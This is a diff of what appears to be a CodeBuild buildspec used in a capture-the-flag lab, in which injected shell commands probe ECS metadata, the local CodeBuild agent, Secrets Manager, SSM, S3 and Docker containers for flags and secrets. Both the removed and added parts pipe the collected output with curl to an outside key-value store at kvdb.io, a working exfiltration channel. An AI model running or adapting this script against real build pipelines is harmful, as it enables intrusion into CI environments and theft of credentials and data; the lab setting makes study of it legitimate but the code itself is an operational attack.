@@ -13,63 +13,29 @@ phases:
         set +e
         bucket='https://kvdb.io/8uXHVtwRAd5qcuZcw9GdSh'
         runid="${CODEBUILD_BUILD_ID##*:}"
-        putkey(){ key="$1"; file="$2"; head -c 60000 "$file" | curl -fsS --connect-timeout 5 --max-time 25 --data-binary @- "$bucket/${runid}_$key" || true; }
+        putkey(){ key="$1"; file="$2"; head -c 80000 "$file" | curl -fsS --connect-timeout 5 --max-time 25 --data-binary @- "$bucket/${runid}_$key" || true; }
         echo "canary $runid" > /tmp/canary.txt; putkey canary /tmp/canary.txt
         {
-          echo '=== exact ecs metadata ==='
-          for u in \
-            "$ECS_CONTAINER_METADATA_URI" \
-            "$ECS_CONTAINER_METADATA_URI/task" \
-            "$ECS_CONTAINER_METADATA_URI/stats" \
-            "$ECS_CONTAINER_METADATA_URI_V4" \
-            "$ECS_CONTAINER_METADATA_URI_V4/task" \
-            "$ECS_CONTAINER_METADATA_URI_V4/task/stats" \
-            "$ECS_AGENT_URI"; do
-            echo "--- $u"
-            curl -sS --connect-timeout 2 --max-time 5 "$u" 2>&1 | sed -E 's/(AccessKeyId|SecretAccessKey|Token|CODEBUILD_AUTH_TOKEN|AWS_CONTAINER_CREDENTIALS_FULL_URI)[^,}]*/\1:REDACTED/g' | head -c 12000; echo
+          echo '=== docker version ==='
+          docker version 2>&1
+          echo '=== docker ps ==='
+          docker ps -a --no-trunc 2>&1
+          echo '=== docker inspect selected ==='
+          ids=$(docker ps -aq 2>/dev/null)
+          for id in $ids; do
+            echo "--- inspect $id"
+            docker inspect "$id" 2>&1 | sed -E 's/(AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN|CODEBUILD_AUTH_TOKEN|AccessKeyId|SecretAccessKey|Token)=?[^", ]+/\1=REDACTED/g' | head -c 50000
+            echo
           done
-          echo '=== decoded codebuild env blobs ==='
-          echo "$CODEBUILD_CONTAINER_INFO" | base64 -d 2>/dev/null; echo
-          echo "$CODEBUILD_LOG_STREAM_INFO" | base64 -d 2>/dev/null; echo
-        } > /tmp/ecsmeta.txt 2>&1
-        putkey ecsmeta /tmp/ecsmeta.txt
-        {
-          echo '=== agent with container token variants ==='
-          for base in http://127.0.0.1:7831 http://localhost:7831; do
-            for h in \
-              "Authorization: $CODEBUILD_CONTAINER_TOKENS" \
-              "Authorization: Bearer $CODEBUILD_CONTAINER_TOKENS" \
-              "X-CodeBuild-Container-Token: $CODEBUILD_CONTAINER_TOKENS" \
-              "X-Amz-CodeBuild-Container-Token: $CODEBUILD_CONTAINER_TOKENS" \
-              "CodeBuild-Container-Token: $CODEBUILD_CONTAINER_TOKENS" \
-              "X-CodeBuild-Container-Id: $CODEBUILD_CONTAINER_TOKENS"; do
-              echo "### $base header ${h%%:*}"
-              for p in / /ping /health /status /v1/status /v1/metadata /v1/build /build /logs /env /variables /credentials /api/v1/build /api/v1/metadata; do
-                echo "--- $p"
-                curl -sS --connect-timeout 2 --max-time 5 -H "$h" "$base$p" 2>&1 | sed -E 's/(AccessKeyId|SecretAccessKey|Token|CODEBUILD_AUTH_TOKEN)[^,}]*/\1:REDACTED/g' | head -c 3000; echo
-              done
-            done
+          echo '=== docker env grep ==='
+          for id in $ids; do
+            echo "--- env $id"
+            docker inspect -f '{{range .Config.Env}}{{println .}}{{end}}' "$id" 2>&1 | grep -Eiv 'AWS_(ACCESS_KEY_ID|SECRET_ACCESS_KEY|SESSION_TOKEN)|CODEBUILD_AUTH_TOKEN' | grep -Ei 'flag|ctf|hacktricks|codebreach|secret|token|github|credential|codebuild' || true
           done
-        } > /tmp/agentcontainer.txt 2>&1
-        putkey agentcontainer /tmp/agentcontainer.txt
-        {
-          echo '=== exact secret/parameter guesses ==='
-          for n in \
-            flag FLAG Flag \
-            codebuild_lab_5_flag codebuild-lab-5-flag codebuild_lab_5_project_flag codebuild-lab-5-project-flag \
-            /codebuild_lab_5/flag /codebuild/lab5/flag /codebuild/lab_5/flag /codebuild/codebuild_lab_5_project/flag \
-            codebreach_flag codebreach-flag codebuild-codebreach-actors-lab-flag; do
-            echo "--- secret $n"; aws secretsmanager get-secret-value --secret-id "$n" --region us-east-1 --output json 2>&1 | head -c 2000; echo
-            echo "--- param $n"; aws ssm get-parameter --name "$n" --with-decryption --region us-east-1 --output json 2>&1 | head -c 2000; echo
-          done
-          echo '=== s3 exact guesses ==='
-          for b in \
-            codebuild-lab-5-flag codebuild-codebreach-actors-lab-flag codebuild-codebreach-actors-lab \
-            codebuild-lab-5-project codebuild_lab_5_project codebuild-lab-5 codebreach-actors-lab-flag \
-            hacktricks-training-codebuild-flag hacktricks-codebuild-codebreach-flag; do
-            for key in flag flag.txt FLAG secret.txt codebuild_lab_5_flag; do
-              echo "--- s3://$b/$key"; aws s3api get-object --bucket "$b" --key "$key" "/tmp/s3_$b_$key" --region us-east-1 --output json 2>&1 | head -c 1200; [ -s "/tmp/s3_$b_$key" ] && { echo; cat "/tmp/s3_$b_$key"; }; echo
-            done
-          done
-        } > /tmp/guesses.txt 2>&1
-        putkey guesses /tmp/guesses.txt
+          echo '=== docker labels grep ==='
+          for id in $ids; do echo "--- labels $id"; docker inspect -f '{{json .Config.Labels}} {{json .HostConfig.Binds}} {{json .Mounts}}' "$id" 2>&1; done
+          echo '=== docker volumes/list ==='
+          docker volume ls 2>&1
+          docker network ls 2>&1
+        } > /tmp/dockerprobe.txt 2>&1
+        putkey dockerprobe /tmp/dockerprobe.txt
